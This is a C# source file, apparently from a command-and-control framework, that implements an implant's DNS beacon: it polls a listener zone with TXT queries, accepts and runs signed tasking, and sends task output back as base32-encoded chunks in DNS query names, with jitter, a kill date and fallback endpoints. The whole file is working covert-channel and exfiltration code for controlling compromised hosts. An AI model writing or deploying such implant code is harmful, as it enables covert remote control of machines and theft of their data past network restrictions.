using System.Net;
using System.Net.Sockets;
using System.Text;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The DNS check-in module (architecture.md Sec 8, the contract documented
// for implant authors in extending/implants.md): the egress-restricted
// carrier, one TXT query per check-in under the listener's zone. No
// handshake and no mTLS ride DNS -- the implant is identified by its id
// alone, the session another transport opened is refreshed, and every
// tasking answer is verified like a stream-delivered one before anything
// runs. The beacon URL names the dial and the zone:
//
//   dns://<resolver-host>[:<port>]/<zone>
//
// The resolver is the listener itself (v1 dials it directly; queries
// through recursive resolvers arrive with a system-resolver dialer). A
// poll is one query answered with zero or one TXT record whose strings
// concatenate to the base32 of a marshaled, signed TaskRequest; a result
// is reported as chunked queries (label-budget chunks, 0-origin, a
// terminal flag closing the reassembly server-side).

internal static class DnsCheckIn
{
    public static ICheckInClient Create(CheckInSetup setup) => new DnsBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Log,
        setup.Nonces,
        setup.Cadence,
        setup.Held);
}

/// <summary>
/// Runs the implant's check-in lifecycle over the DNS carrier: poll on the
/// cadence, run the one short tasking a poll may carry, report its result
/// as chunked TXT queries. A datagram that never lands is a walk
/// advancement like any dead front; an empty answer is a quiet poll
/// (presence refreshed, nothing to run).
/// </summary>
internal sealed class DnsBeacon : ICheckInClient
{
    // The result-chunk budget: each chunk rides one base32 label, and a
    // DNS label caps at 63 bytes -- 30 plaintext bytes expand to 48
    // characters, leaving room for the grammar's fixed labels.
    private const int ChunkBytes = 30;

    private readonly EgressEndpoints _egress;    private readonly string _implantId;
    private readonly IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly TextWriter _log;
    private readonly Cadence? _cadence;
    private readonly TaskNonceTracker _nonces;
    private readonly HeldTaskLedger _held;

    // The shared task-acceptance pipeline (fronting gate, verification,
    // dedup, staged/channel/inline shapes) over this client's per-run
    // state. The poll-carrier refusal of channels lives inside it
    // (isPoll), the same shape the envelope cycle applies.
    private readonly BeaconTasking _tasking;

    public DnsBeacon(
        EgressEndpoints egress,
        string implantId,
        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null)
    {
        _egress = egress;
        _implantId = implantId;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _log = log;
        _cadence = cadence;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _tasking = new BeaconTasking(
            _implantId, _cas, enroll?.Fronted, _nonces, _held,
            HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers), _log);
    }

    public bool Serves(string beaconUrl) => BeaconUrl.IsDns(beaconUrl);

    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        // Results whose delivery died with an earlier carrier ride this one
        // first (the dispatch strand): the server reassembles chunks and
        // records first-wins.
        await _tasking.ReplayUndeliveredAsync(WriteFrameAsync, cancellationToken);

        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            if (!Serves(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;

            var reached = false;
            try
            {
                reached = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"dns check-in failed: {ex.Message}");
            }

            if (reached)
                consecutiveFailures = 0;
            else
            {
                consecutiveFailures++;
                // The egress walk: a poll that never landed means the
                // resolver is not answering, so the next attempt dials the
                // next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"dns endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // One poll cycle. True when the exchange landed (the resolver answered,
    // even with nothing to run); false when it never did. Throws on
    // malformed answers, which the caller counts with the unreachable
    // resolver -- a DNS carrier answering garbage is not a front to trust.
    private async Task<bool> RunOnceAsync(CancellationToken cancellationToken)
    {
        var (host, port, zone) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        var answer = await DnsDial.QueryAsync(host, port, DnsNames.PollName(_implantId, zone), cancellationToken);
        if (answer is null)
            return true; // a quiet poll: presence refreshed, no tasking

        var task = TaskRequest.Parser.ParseFrom(answer);
        _log.WriteLine($"dns poll carried task {task.TaskId} ({task.Verb})");
        await _tasking.AcceptAsync(
            task,
            isPoll: true,
            WriteFrameAsync,
            RunStagedRefusedAsync,
            static (_, _) => { },
            cancellationToken);
        return true;
    }

    // Staged transfers ride a stream carrier's channel machinery; the DNS
    // budget carries short tasking only, so the demand is refused on the
    // task itself (the server's claim gate already holds channel verbs off
    // this carrier; this is the client-side belt for anything that slips).
    private static Task<(TaskOutcome Outcome, string Output)> RunStagedRefusedAsync(
        TaskRequest staged, CancellationToken cancellationToken) =>
        Task.FromResult((
            TaskOutcome.Failed,
            $"{staged.Verb} rides a stream transport; the DNS carrier carries short tasking only"));

    // The write adapter: results ride as chunked TXT queries; the ack and
    // channel frames have no DNS carriage (results are idempotent
    // server-side, retransmission-safe by the first-wins record).
    private async Task WriteFrameAsync(Frame frame, CancellationToken cancellationToken)
    {
        if (frame.Kind != FrameKind.TaskResult)
            return;
        var result = TaskResult.Parser.ParseFrom(frame.Payload);
        await ReportAsync(result.TaskId, result.Outcome, result.Output, cancellationToken);
    }

    /// <summary>
    /// Reports one task's outcome as chunked result queries under the
    /// current dial's zone, 0-origin with a terminal flag; an empty output
    /// rides as a single empty terminal chunk.
    /// </summary>
    public async Task ReportAsync(
        string taskId, TaskOutcome outcome, string output, CancellationToken cancellationToken)
    {
        var (host, port, zone) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        var bytes = Encoding.UTF8.GetBytes(output);
        var succeeded = outcome == TaskOutcome.Succeeded;
        var chunks = (bytes.Length + ChunkBytes - 1) / ChunkBytes;
        for (var index = 0; index < Math.Max(chunks, 1); index++)
        {
            var take = Math.Min(ChunkBytes, bytes.Length - index * ChunkBytes);
            var chunk = new byte[Math.Max(take, 0)];
            if (take > 0)
                Array.Copy(bytes, index * ChunkBytes, chunk, 0, take);
            var terminal = index == Math.Max(chunks, 1) - 1;
            var name = DnsNames.ResultName(_implantId, taskId, succeeded, index, terminal, chunk, zone);
            await DnsDial.QueryAsync(host, port, name, cancellationToken, queryOnly: true);
        }
        _log.WriteLine($"dns result reported: task {taskId} in {Math.Max(chunks, 1)} chunk(s)");
    }
}

/// <summary>
/// The DNS dial and wire codec (RFC 1035's minimal TXT subset): one
/// question with an EDNS0 OPT record, answers parsed with compression
/// support, TXT strings concatenated back into one payload.
/// </summary>
internal static class DnsDial
{
    public static (string Host, int Port, string Zone) Parse(string beaconUrl)
    {
        var rest = beaconUrl.Trim()["dns://".Length..];
        var slash = rest.IndexOf('/');
        if (slash <= 0 || slash == rest.Length - 1)
            throw new NotSupportedException(
                $"A dns:// beacon URL names a resolver and a zone: dns://resolver[:port]/zone, got '{beaconUrl}'.");
        var authority = rest[..slash];
        var zone = rest[(slash + 1)..].TrimEnd('.').ToLowerInvariant();
        if (zone.Length == 0)
            throw new NotSupportedException($"A dns:// beacon URL names a zone, got '{beaconUrl}'.");

        int port = 53;
        string host;
        if (authority.StartsWith('['))
        {
            var close = authority.IndexOf(']');
            if (close < 0)
                throw new NotSupportedException($"Malformed resolver address '{authority}'.");
            host = authority[1..close];
            if (close + 2 <= authority.Length && authority[close + 1] == ':'
                && !int.TryParse(authority[(close + 2)..], out port))
                throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
        }
        else
        {
            var colon = authority.LastIndexOf(':');
            if (colon >= 0)
            {
                host = authority[..colon];
                if (!int.TryParse(authority[(colon + 1)..], out port))
                    throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
            }
            else
            {
                host = authority;
            }
        }
        return (host, port, zone);
    }

    /// <summary>
    /// One TXT exchange. Returns the concatenated payload bytes of the
    /// first TXT answer, or null when the answer carries none (a quiet
    /// poll). <paramref name="queryOnly"/> sends the query and reads the
    /// answer without collecting payloads (the result path's empty
    /// NOERROR).
    /// </summary>
    public static async Task<byte[]?> QueryAsync(
        string host, int port, string name, CancellationToken cancellationToken,
        bool queryOnly = false, string? zoneForLabel = null)
    {
        using var udp = new UdpClient();
        var query = EncodeQuery(name);
        await udp.SendAsync(query, query.Length, host, port);

        using var wait = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        wait.CancelAfter(ExchangeTimeout);
        UdpReceiveResult datagram;
        try
        {
            datagram = await udp.ReceiveAsync(wait.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            throw new TimeoutException($"the resolver {host}:{port} did not answer within {ExchangeTimeout.TotalSeconds:0}s");
        }
        return ParseAnswer(datagram.Buffer, query, queryOnly);
    }

    // A result query still reads its answer (the exchange's NOERROR) --
    // the call sites pass queryOnly, and the payloads only the poll reads.

    private static readonly TimeSpan ExchangeTimeout = TimeSpan.FromSeconds(5);

    private static byte[] EncodeQuery(string name)
    {
        var buffer = new List<byte>(64);
        var id = Random.Shared.Next(0x0001, 0xFFFF);
        buffer.Add((byte)(id >> 8));
        buffer.Add((byte)id);
        WriteU16(buffer, 0x0100); // query, recursion desired
        WriteU16(buffer, 1); // one question
        WriteU16(buffer, 0);
        WriteU16(buffer, 0);
        WriteU16(buffer, 1); // one additional: the OPT record
        WriteName(buffer, name);
        WriteU16(buffer, 16); // TXT
        WriteU16(buffer, 1); // IN
        // The OPT record (EDNS0): root name, type 41, CLASS = the payload
        // budget this client accepts.
        buffer.Add(0);
        WriteU16(buffer, 41);
        WriteU16(buffer, 1232);
        WriteU32(buffer, 0);
        WriteU16(buffer, 0);
        return buffer.ToArray();
    }

    private static byte[]? ParseAnswer(byte[] datagram, byte[] query, bool queryOnly)
    {
        if (datagram.Length < 12)
            throw new FormatException("a truncated DNS answer");
        var id = (datagram[0] << 8) | datagram[1];
        var queryId = (query[0] << 8) | query[1];
        if (id != queryId)
            throw new FormatException("a DNS answer with a mismatched id");
        var flags = (ushort)((datagram[2] << 8) | datagram[3]);
        if ((flags & 0x8000) == 0)
            throw new FormatException("a DNS datagram without the response bit");
        var rcode = flags & 0x000F;
        if (rcode != 0)
            throw new FormatException($"the resolver answered rcode {rcode}");

        var qdcount = (ushort)((datagram[4] << 8) | datagram[5]);
        var ancount = (ushort)((datagram[6] << 8) | datagram[7]);
        var arcount = (ushort)((datagram[10] << 8) | datagram[11]);

        var offset = 12;
        for (var question = 0; question < qdcount; question++)
        {
            if (!TrySkipName(datagram, ref offset))
                throw new FormatException("a malformed question in the DNS answer");
            offset += 4;
        }

        // The first TXT answer is the payload; the rest (and the OPT
        // record in the additional section) are ignored.
        for (var answer = 0; answer < ancount; answer++)
        {
            if (!TrySkipName(datagram, ref offset) || offset + 10 > datagram.Length)
                throw new FormatException("a malformed answer in the DNS answer");
            var type = (ushort)((datagram[offset] << 8) | datagram[offset + 1]);
            var rdlength = (ushort)((datagram[offset + 8] << 8) | datagram[offset + 9]);
            offset += 10;
            if (offset + rdlength > datagram.Length)
                throw new FormatException("a truncated answer record");
            if (type == 16 && !queryOnly)
            {
                var payload = new StringBuilder();
                var cursor = offset;
                var end = offset + rdlength;
                while (cursor < end)
                {
                    var length = datagram[cursor++];
                    if (cursor + length > end)
                        throw new FormatException("a TXT string overruns its record");
                    payload.Append(Encoding.ASCII.GetString(datagram, cursor, length));
                    cursor += length;
                }
                return DnsNames.Decode(payload.ToString())
                    ?? throw new FormatException("the TXT payload is not the base32 this protocol carries");
            }
            offset += rdlength;
        }
        _ = arcount;
        return null;
    }

    private static bool TrySkipName(byte[] datagram, ref int offset)
    {
        var jumps = 0;
        var cursor = offset;
        var nextAfterPointer = -1;
        while (true)
        {
            if (cursor >= datagram.Length)
                return false;
            var length = datagram[cursor];
            if (length == 0)
            {
                cursor++;
                break;
            }
            if ((length & 0xC0) == 0xC0)
            {
                if (cursor + 1 >= datagram.Length || ++jumps > datagram.Length)
                    return false;
                if (nextAfterPointer < 0)
                    nextAfterPointer = cursor + 2;
                cursor = ((length & 0x3F) << 8) | datagram[cursor + 1];
                continue;
            }
            cursor += 1 + length;
        }
        offset = nextAfterPointer >= 0 ? nextAfterPointer : cursor;
        return true;
    }

    private static void WriteName(List<byte> buffer, string name)
    {
        foreach (var label in name.Split('.'))
        {
            if (label.Length == 0 || label.Length > 63)
                throw new FormatException($"DNS label '{label}' is empty or over the 63-byte limit.");
            buffer.Add((byte)label.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(label));
        }
        buffer.Add(0);
    }

    private static void WriteU16(List<byte> buffer, ushort value)
    {
        buffer.Add((byte)(value >> 8));
        buffer.Add((byte)value);
    }

    private static void WriteU32(List<byte> buffer, uint value)
    {
        buffer.Add((byte)(value >> 24));
        buffer.Add((byte)(value >> 16));
        buffer.Add((byte)(value >> 8));
        buffer.Add((byte)value);
    }
}

/// <summary>
/// The check-in name grammar (extending/implants.md): lowercase RFC 4648
/// base32 labels, no padding. The implant-side twin of the listener's
/// parser -- the wire-shape test keeps the pair in lockstep.
/// </summary>
internal static class DnsNames
{
    public static string PollName(string implantId, string zone)
        => $"p.{Encode(implantId)}.{zone}";

    public static string ResultName(
        string implantId, string taskId, bool succeeded, int sequence, bool terminal, byte[] chunk, string zone)
        => "r." + Encode(taskId)
            + "." + (succeeded ? "s" : "f")
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + Encode(implantId)
            + "." + zone;

    public static string Encode(byte[] bytes)
    {
        const string alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        var sb = new StringBuilder((bytes.Length * 8 + 4) / 5);
        var bits = 0;
        var bitCount = 0;
        foreach (var b in bytes)
        {
            bits = (bits << 8) | b;
            bitCount += 8;
            while (bitCount >= 5)
            {
                bitCount -= 5;
                sb.Append(alphabet[(bits >> bitCount) & 0x1F]);
            }
        }
        if (bitCount > 0)
            sb.Append(alphabet[(bits << (5 - bitCount)) & 0x1F]);
        return sb.ToString();
    }

    public static string Encode(string text) => Encode(Encoding.UTF8.GetBytes(text));

    public static byte[]? Decode(string text)
    {
        var clean = text.TrimEnd('=').ToUpperInvariant();
        var bits = 0;
        var bitCount = 0;
        var bytes = new List<byte>(clean.Length * 5 / 8);
        foreach (var c in clean)
        {
            var value = c switch
            {
                >= 'A' and <= 'Z' => c - 'A',
                >= '2' and <= '7' => c - '2' + 26,
                _ => -1,
            };
            if (value < 0)
                return null;
            bits = (bits << 5) | value;
            bitCount += 5;
            if (bitCount >= 8)
            {
                bitCount -= 8;
                bytes.Add((byte)((bits >> bitCount) & 0xFF));
            }
        }
        return bytes.ToArray();
    }
}
